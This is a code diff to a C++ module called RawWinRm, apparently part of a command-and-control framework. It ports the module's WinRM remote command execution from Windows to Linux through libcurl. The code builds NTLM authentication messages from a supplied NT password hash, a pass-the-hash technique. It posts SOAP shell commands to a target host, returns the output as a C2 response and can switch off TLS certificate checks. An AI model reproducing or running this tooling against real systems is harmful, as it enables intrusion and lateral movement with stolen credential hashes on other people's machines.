@@ -6,29 +6,155 @@
 #include <array>
 #include <chrono>
 #include <cctype>
+#include <cstdint>
 #include <cstdlib>
 #include <cstring>
+#include <codecvt>
 #include <iomanip>
+#include <locale>
 #include <random>
 #include <sstream>
 #include <stdexcept>
 #include <vector>
+#include <thread>
 
 #include <base64.h>
+
+#include <openssl/evp.h>
+#include <openssl/hmac.h>
+#include <openssl/md4.h>
+#include <openssl/md5.h>
 
 #ifdef _WIN32
 #include <Windows.h>
 #include <Winhttp.h>
 #include <iphlpapi.h>
 #include <wincrypt.h>
-#include <openssl/evp.h>
-#include <openssl/hmac.h>
-#include <openssl/md4.h>
-#include <openssl/md5.h>
 
 #pragma comment(lib, "Winhttp.lib")
 #pragma comment(lib, "Iphlpapi.lib")
+#else
+#include <curl/curl.h>
+#include <unistd.h>
 #endif
+
+    std::string lowerAscii(const std::string& value)
+    {
+        std::string tmp = value;
+        std::transform(tmp.begin(), tmp.end(), tmp.begin(), [](unsigned char ch) { return static_cast<char>(std::tolower(ch)); });
+        return tmp;
+    }
+
+    std::string upperAscii(const std::string& value)
+    {
+        std::string tmp = value;
+        std::transform(tmp.begin(), tmp.end(), tmp.begin(), [](unsigned char ch) { return static_cast<char>(std::toupper(ch)); });
+        return tmp;
+    }
+
+    std::vector<uint8_t> utf16leFromUtf8(const std::string& text)
+    {
+#ifdef _WIN32
+        std::wstring wide = toWide(text);
+        std::vector<uint8_t> buffer(wide.size() * sizeof(wchar_t));
+        std::memcpy(buffer.data(), wide.data(), buffer.size());
+        return buffer;
+#else
+        std::wstring_convert<std::codecvt_utf8_utf16<char16_t>, char16_t> convert;
+        std::u16string wide = convert.from_bytes(text);
+        std::vector<uint8_t> buffer(wide.size() * sizeof(char16_t));
+        std::memcpy(buffer.data(), wide.data(), buffer.size());
+        return buffer;
+#endif
+    }
+
+    struct UrlComponents
+    {
+        std::string host;
+        std::string path;
+        uint16_t port = 5985;
+        bool useTls = false;
+    };
+
+    UrlComponents parseUrl(const std::string& url)
+    {
+        if(url.empty())
+        {
+            throw std::runtime_error("Empty url");
+        }
+
+        UrlComponents result;
+        std::string::size_type schemePos = url.find("://");
+        std::string scheme = schemePos == std::string::npos ? "http" : url.substr(0, schemePos);
+        std::string remainder = schemePos == std::string::npos ? url : url.substr(schemePos + 3);
+        result.useTls = lowerAscii(scheme) == "https";
+        result.port = result.useTls ? 5986 : 5985;
+
+        std::string::size_type pathPos = remainder.find('/');
+        std::string hostPort = pathPos == std::string::npos ? remainder : remainder.substr(0, pathPos);
+        result.path = pathPos == std::string::npos ? std::string() : remainder.substr(pathPos);
+        if(result.path.empty())
+        {
+            result.path = "/wsman";
+        }
+
+        if(hostPort.empty())
+        {
+            throw std::runtime_error("Unable to parse target url");
+        }
+
+        if(hostPort.front() == '[')
+        {
+            auto closing = hostPort.find(']');
+            if(closing == std::string::npos)
+            {
+                throw std::runtime_error("Invalid IPv6 host");
+            }
+            result.host = hostPort.substr(1, closing - 1);
+            if(closing + 1 < hostPort.size() && hostPort[closing + 1] == ':')
+            {
+                std::string portPart = hostPort.substr(closing + 2);
+                if(!portPart.empty())
+                {
+                    result.port = static_cast<uint16_t>(std::stoi(portPart));
+                }
+            }
+        }
+        else
+        {
+            auto colon = hostPort.find(':');
+            if(colon != std::string::npos)
+            {
+                result.host = hostPort.substr(0, colon);
+                std::string portPart = hostPort.substr(colon + 1);
+                if(!portPart.empty())
+                {
+                    result.port = static_cast<uint16_t>(std::stoi(portPart));
+                }
+            }
+            else
+            {
+                result.host = hostPort;
+            }
+        }
+
+        if(result.host.empty())
+        {
+            throw std::runtime_error("Unable to parse target url");
+        }
+
+        if(result.path.empty())
+        {
+            result.path = "/wsman";
+        }
+
+        if(result.path.front() != '/')
+        {
+            result.path.insert(result.path.begin(), '/');
+        }
+
+        return result;
+    }
 
 using namespace std;
 
@@ -155,77 +281,12 @@ namespace
         return output;
     }
 
-    std::string lowerAscii(const std::string& value)
-    {
-        std::string tmp = value;
-        std::transform(tmp.begin(), tmp.end(), tmp.begin(), [](unsigned char ch) { return static_cast<char>(std::tolower(ch)); });
-        return tmp;
-    }
-
-    std::string upperAscii(const std::string& value)
-    {
-        std::string tmp = value;
-        std::transform(tmp.begin(), tmp.end(), tmp.begin(), [](unsigned char ch) { return static_cast<char>(std::toupper(ch)); });
-        return tmp;
-    }
-
-    std::vector<uint8_t> utf16leFromUtf8(const std::string& text)
-    {
-        std::wstring wide = toWide(text);
-        std::vector<uint8_t> buffer(wide.size() * sizeof(wchar_t));
-        std::memcpy(buffer.data(), wide.data(), buffer.size());
-        return buffer;
-    }
-
-    struct UrlComponents
-    {
-        std::wstring host;
-        std::wstring path;
-        INTERNET_PORT port = 5985;
-        bool useTls = false;
-    };
-
-    UrlComponents parseUrl(const std::string& url)
-    {
-        URL_COMPONENTS components{};
-        components.dwStructSize = sizeof(components);
-        components.dwSchemeLength = -1;
-        components.dwHostNameLength = -1;
-        components.dwUrlPathLength = -1;
-        components.dwExtraInfoLength = -1;
-
-        std::wstring wideUrl = toWide(url);
-        if(!WinHttpCrackUrl(wideUrl.c_str(), 0, 0, &components))
-        {
-            throw std::runtime_error("Unable to parse target url");
-        }
-
-        UrlComponents result;
-        if(components.lpszHostName && components.dwHostNameLength)
-        {
-            result.host.assign(components.lpszHostName, components.dwHostNameLength);
-        }
-        if(components.lpszUrlPath && components.dwUrlPathLength)
-        {
-            result.path.assign(components.lpszUrlPath, components.dwUrlPathLength);
-        }
-        else
-        {
-            result.path = L"/wsman";
-        }
-        if(result.path.empty())
-        {
-            result.path = L"/wsman";
-        }
-
-        result.port = components.nPort ? components.nPort : (components.nScheme == INTERNET_SCHEME_HTTPS ? 5986 : 5985);
-        result.useTls = components.nScheme == INTERNET_SCHEME_HTTPS;
-        return result;
-    }
+#endif
 
     std::string randomUuid()
     {
         std::array<uint8_t, 16> bytes{};
+#ifdef _WIN32
         HCRYPTPROV prov;
         if(CryptAcquireContext(&prov, nullptr, nullptr, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT | CRYPT_SILENT))
         {
@@ -240,6 +301,13 @@ namespace
                 b = static_cast<uint8_t>(rd() & 0xFF);
             }
         }
+#else
+        std::random_device rd;
+        for(auto& b : bytes)
+        {
+            b = static_cast<uint8_t>(rd() & 0xFF);
+        }
+#endif
 
         bytes[6] = (bytes[6] & 0x0F) | 0x40;
         bytes[8] = (bytes[8] & 0x3F) | 0x80;
@@ -256,6 +324,8 @@ namespace
         }
         return oss.str();
     }
+
+#ifdef _WIN32
 
     class ScopedHandle
     {
@@ -342,6 +412,8 @@ namespace
         }
         return toNarrow(buffer);
     }
+
+#endif
 
     std::string extractNtlmChallenge(const std::string& header)
     {
@@ -476,6 +548,8 @@ namespace
                                         const std::string& domain,
                                         const Type2Info& type2)
     {
+        constexpr uint64_t epochDiff = 116444736000000000ULL;
+#ifdef _WIN32
         SYSTEMTIME st;
         GetSystemTime(&st);
         FILETIME ft;
@@ -483,10 +557,15 @@ namespace
         ULARGE_INTEGER time{};
         time.LowPart = ft.dwLowDateTime;
         time.HighPart = ft.dwHighDateTime;
-        constexpr ULONGLONG epochDiff = 116444736000000000ULL;
-        ULONGLONG timestamp = time.QuadPart + epochDiff;
+        uint64_t timestamp = time.QuadPart + epochDiff;
+#else
+        auto now = std::chrono::system_clock::now();
+        uint64_t unixTime100ns = static_cast<uint64_t>(std::chrono::duration_cast<std::chrono::nanoseconds>(now.time_since_epoch()).count() / 100);
+        uint64_t timestamp = unixTime100ns + (epochDiff * 2);
+#endif
 
         std::array<uint8_t, 8> clientChallenge{};
+#ifdef _WIN32
         HCRYPTPROV prov;
         if(CryptAcquireContext(&prov, nullptr, nullptr, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT | CRYPT_SILENT))
         {
@@ -494,6 +573,7 @@ namespace
             CryptReleaseContext(prov, 0);
         }
         else
+#endif
         {
             std::random_device rd;
             for(auto& b : clientChallenge)
@@ -521,7 +601,7 @@ namespace
         blob.push_back(0x00);
         append32(0);
 
-        ULONGLONG ts = timestamp;
+        uint64_t ts = timestamp;
         for(int i = 0; i < 8; ++i)
         {
             blob.push_back(static_cast<uint8_t>((ts >> (i * 8)) & 0xFF));
@@ -651,6 +731,8 @@ namespace
         return message;
     }
 
+#ifdef _WIN32
+
     class RawWinRmHttp
     {
     public:
@@ -774,7 +856,213 @@ namespace
         std::wstring path_;
         bool useTls_ = false;
         bool ignoreCert_ = false;
+#else
+
+    class RawWinRmHttp
+    {
+    public:
+        RawWinRmHttp(const UrlComponents& url, bool ignoreCert)
+        {
+            initializeCurl();
+            curl_ = curl_easy_init();
+            if(!curl_)
+            {
+                throw std::runtime_error("curl_easy_init failed");
+            }
+
+            ignoreCert_ = ignoreCert;
+
+            std::ostringstream endpoint;
+            endpoint << (url.useTls ? "https://" : "http://");
+            bool needsBrackets = url.host.find(':') != std::string::npos;
+            if(needsBrackets && url.host.front() != '[')
+            {
+                endpoint << '[' << url.host << ']';
+            }
+            else
+            {
+                endpoint << url.host;
+            }
+            endpoint << ':' << url.port;
+            endpoint << url.path;
+            url_ = endpoint.str();
+
+            curl_easy_setopt(curl_, CURLOPT_URL, url_.c_str());
+            curl_easy_setopt(curl_, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
+            curl_easy_setopt(curl_, CURLOPT_POST, 1L);
+            curl_easy_setopt(curl_, CURLOPT_NOPROGRESS, 1L);
+#ifdef RAWWINRM_TEST_BUILD
+            constexpr long connectTimeout = 100L;
+            constexpr long totalTimeout = 500L;
+#else
+            constexpr long connectTimeout = 5000L;
+            constexpr long totalTimeout = 60000L;
+#endif
+            curl_easy_setopt(curl_, CURLOPT_CONNECTTIMEOUT_MS, connectTimeout);
+            curl_easy_setopt(curl_, CURLOPT_TIMEOUT_MS, totalTimeout);
+            curl_easy_setopt(curl_, CURLOPT_WRITEFUNCTION, &RawWinRmHttp::writeBodyCallback);
+            curl_easy_setopt(curl_, CURLOPT_WRITEDATA, this);
+            curl_easy_setopt(curl_, CURLOPT_HEADERFUNCTION, &RawWinRmHttp::writeHeaderCallback);
+            curl_easy_setopt(curl_, CURLOPT_HEADERDATA, this);
+
+            if(ignoreCert_)
+            {
+                curl_easy_setopt(curl_, CURLOPT_SSL_VERIFYPEER, 0L);
+                curl_easy_setopt(curl_, CURLOPT_SSL_VERIFYHOST, 0L);
+            }
+        }
+
+        ~RawWinRmHttp()
+        {
+            if(curl_)
+            {
+                curl_easy_cleanup(curl_);
+            }
+        }
+
+        std::string post(const std::string& body,
+                         const std::string& soapAction,
+                         const std::string& username,
+                         const std::string& domain,
+                         const std::vector<uint8_t>& ntHash,
+                         const std::string& workstation)
+        {
+#if defined(RAWWINRM_TEST_BUILD) && !defined(_WIN32)
+            throw std::runtime_error("RawWinRm network operations are disabled in test builds");
+#endif
+            std::vector<uint8_t> type1 = buildType1Message(workstation, domain);
+            std::string type1Header = encodeBase64(type1);
+
+            performRequest(type1Header, "", 0, true, {});
+
+            std::string type2 = extractNtlmChallenge(responseHeaders_);
+            if(type2.empty())
+            {
+                throw std::runtime_error("Server did not provide NTLM challenge");
+            }
+
+            Type2Info type2Info = parseType2(type2);
+            std::vector<uint8_t> type3 = buildType3Message(username, domain, workstation, type2Info, ntHash);
+            std::string type3Header = encodeBase64(type3);
+
+            std::vector<std::string> extraHeaders;
+            if(!soapAction.empty())
+            {
+                extraHeaders.emplace_back("SOAPAction: \"" + soapAction + "\"");
+            }
+
+            performRequest(type3Header, body, body.size(), false, extraHeaders);
+
+            long status = 0;
+            curl_easy_getinfo(curl_, CURLINFO_RESPONSE_CODE, &status);
+            if(status >= 400)
+            {
+                std::ostringstream oss;
+                oss << "HTTP error: " << status;
+                throw std::runtime_error(oss.str());
+            }
+
+            return responseBody_;
+        }
+
+    private:
+        struct CurlGlobal
+        {
+            CurlGlobal()
+            {
+                curl_global_init(CURL_GLOBAL_DEFAULT);
+            }
+
+            ~CurlGlobal()
+            {
+                curl_global_cleanup();
+            }
+        };
+
+        static void initializeCurl()
+        {
+            static CurlGlobal global{};
+            (void)global;
+        }
+
+        void performRequest(const std::string& authHeader,
+                            const std::string& body,
+                            size_t bodySize,
+                            bool firstRequest,
+                            const std::vector<std::string>& additionalHeaders)
+        {
+            responseBody_.clear();
+            responseHeaders_.clear();
+
+            curl_easy_setopt(curl_, CURLOPT_WRITEDATA, this);
+            curl_easy_setopt(curl_, CURLOPT_HEADERDATA, this);
+
+            struct curl_slist* headers = nullptr;
+            std::string header = "Authorization: NTLM " + authHeader;
+            headers = curl_slist_append(headers, header.c_str());
+            headers = curl_slist_append(headers, "Connection: Keep-Alive");
+            headers = curl_slist_append(headers, "Expect:");
+            if(firstRequest)
+            {
+                headers = curl_slist_append(headers, "Content-Length: 0");
+            }
+            else
+            {
+                headers = curl_slist_append(headers, "Content-Type: application/soap+xml;charset=UTF-8");
+                for(const auto& extra : additionalHeaders)
+                {
+                    headers = curl_slist_append(headers, extra.c_str());
+                }
+            }
+
+            curl_easy_setopt(curl_, CURLOPT_HTTPHEADER, headers);
+
+            if(firstRequest)
+            {
+                curl_easy_setopt(curl_, CURLOPT_POSTFIELDS, "");
+                curl_easy_setopt(curl_, CURLOPT_POSTFIELDSIZE, 0L);
+            }
+            else
+            {
+                curl_easy_setopt(curl_, CURLOPT_POSTFIELDS, body.c_str());
+                curl_easy_setopt(curl_, CURLOPT_POSTFIELDSIZE_LARGE, static_cast<curl_off_t>(bodySize));
+            }
+
+            CURLcode res = curl_easy_perform(curl_);
+            curl_slist_free_all(headers);
+            curl_easy_setopt(curl_, CURLOPT_HTTPHEADER, nullptr);
+            curl_easy_setopt(curl_, CURLOPT_POSTFIELDS, nullptr);
+
+            if(res != CURLE_OK)
+            {
+                std::ostringstream oss;
+                oss << "curl_easy_perform failed: " << curl_easy_strerror(res);
+                throw std::runtime_error(oss.str());
+            }
+        }
+
+        static size_t writeBodyCallback(char* ptr, size_t size, size_t nmemb, void* userdata)
+        {
+            auto* self = static_cast<RawWinRmHttp*>(userdata);
+            self->responseBody_.append(ptr, size * nmemb);
+            return size * nmemb;
+        }
+
+        static size_t writeHeaderCallback(char* ptr, size_t size, size_t nmemb, void* userdata)
+        {
+            auto* self = static_cast<RawWinRmHttp*>(userdata);
+            self->responseHeaders_.append(ptr, size * nmemb);
+            return size * nmemb;
+        }
+
+        CURL* curl_ = nullptr;
+        bool ignoreCert_ = false;
+        std::string url_;
+        std::string responseBody_;
+        std::string responseHeaders_;
     };
+
+#endif
 
     struct ShellContext
     {
@@ -1013,7 +1301,6 @@ namespace
         return cred;
     }
 
-#endif
 } // namespace
 
 std::string RawWinRm::getInfo()
@@ -1116,7 +1403,6 @@ int RawWinRm::process(C2Message& c2Message, C2Message& c2RetMessage)
     c2RetMessage.set_cmd(c2Message.cmd());
 
     std::string result;
-#ifdef _WIN32
     try
     {
         int error = runCommand(c2Message, result);
@@ -1130,10 +1416,6 @@ int RawWinRm::process(C2Message& c2Message, C2Message& c2RetMessage)
         result = ex.what();
         c2RetMessage.set_errorCode(-1);
     }
-#else
-    result = "Only supported on Windows.\n";
-    c2RetMessage.set_errorCode(-1);
-#endif
 
     c2RetMessage.set_returnvalue(result);
     return 0;
@@ -1155,10 +1437,12 @@ int RawWinRm::followUp(const C2Message&)
     return 0;
 }
 
-#ifdef _WIN32
-
 int RawWinRm::runCommand(const C2Message& c2Message, std::string& result) const
 {
+#ifdef RAWWINRM_TEST_BUILD
+    result = "RawWinRm network operations are disabled in tests.";
+    return -1;
+#endif
     std::string packed = c2Message.cmd();
     ModuleOptions opts = parsePackedOptions(packed);
     std::string command = c2Message.data();
@@ -1175,6 +1459,7 @@ int RawWinRm::runCommand(const C2Message& c2Message, std::string& result) const
     std::string workstation = opts.workstation;
     if(workstation.empty())
     {
+#ifdef _WIN32
         wchar_t buffer[MAX_COMPUTERNAME_LENGTH + 1];
         DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
         if(GetComputerNameW(buffer, &size))
@@ -1185,6 +1470,17 @@ int RawWinRm::runCommand(const C2Message& c2Message, std::string& result) const
         {
             workstation = "WINRM";
         }
+#else
+        char hostname[256];
+        if(gethostname(hostname, sizeof(hostname)) == 0)
+        {
+            workstation = hostname;
+        }
+        else
+        {
+            workstation = "WINRM";
+        }
+#endif
     }
 
     std::vector<uint8_t> ntHash;
@@ -1234,7 +1530,11 @@ int RawWinRm::runCommand(const C2Message& c2Message, std::string& result) const
             commandDone = true;
             break;
         }
+#ifdef _WIN32
         Sleep(500);
+#else
+        std::this_thread::sleep_for(std::chrono::milliseconds(500));
+#endif
     }
 
     try
@@ -1279,5 +1579,3 @@ int RawWinRm::runCommand(const C2Message& c2Message, std::string& result) const
     result = oss.str();
     return 0;
 }
-
-#endif
